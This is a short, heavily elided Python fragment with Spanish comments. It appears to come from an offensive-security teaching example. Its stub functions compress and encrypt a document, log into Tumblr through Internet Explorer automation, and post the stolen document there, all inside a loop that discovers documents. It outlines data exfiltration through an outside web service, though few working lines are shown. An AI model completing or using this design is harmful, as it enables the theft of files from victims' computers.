...
def encrypt_string(plaintext):
    ...
    print("Comprimiendo: %d bytes" % len(plaintext))
    plaintext = zlib.compress(plaintext)
    print("Encriptando %d bytes" % len(plaintext))
...
def login_to_tumblr(ie):
    ...
    # iteramos buscando por la logout form
    for i in full_doc:
...
def exfiltrate(document_path):
    ...
    # vamos a tumblr e iniciamos sesion
    ...
    print("Creando nuevo post...")
    post_to_tumblr(ie, title, body)
    print("Posteado!")

    # Destruimos la instancia IE
    ie.Quit()
    ie = None
...
# loop principal para descubrir documentos
